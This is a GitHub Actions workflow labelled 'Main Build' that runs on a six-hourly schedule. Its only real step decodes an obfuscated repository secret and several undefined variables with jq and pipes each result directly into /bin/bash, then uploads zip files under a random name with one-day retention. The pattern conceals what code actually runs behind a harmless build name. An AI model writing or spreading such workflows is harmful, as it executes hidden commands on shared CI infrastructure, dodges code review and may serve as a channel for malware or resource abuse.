name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '35 0,6,12,18 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  scheduler:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Invoke
        env:
          javvn184: ${{ secrets.javvn184 }}
        run: |
          printf '%s' "$javvn184" | jq -r .jlrg663 | /bin/bash
          echo $cop10 | jq -r .fgsv9427 | /bin/bash
          echo $pm94 | jq -r .vqncs8946 | /bin/bash
          printf '%s' "$nvc165" | jq -r .p936 | /bin/bash
          printf '%s' "$e87" | jq -r .sx890 | /bin/bash

      - name: Store artifact
        uses: actions/upload-artifact@v4
        with:
          name: M67PUxcN
          path: "*.zip"
          retention-days: 1
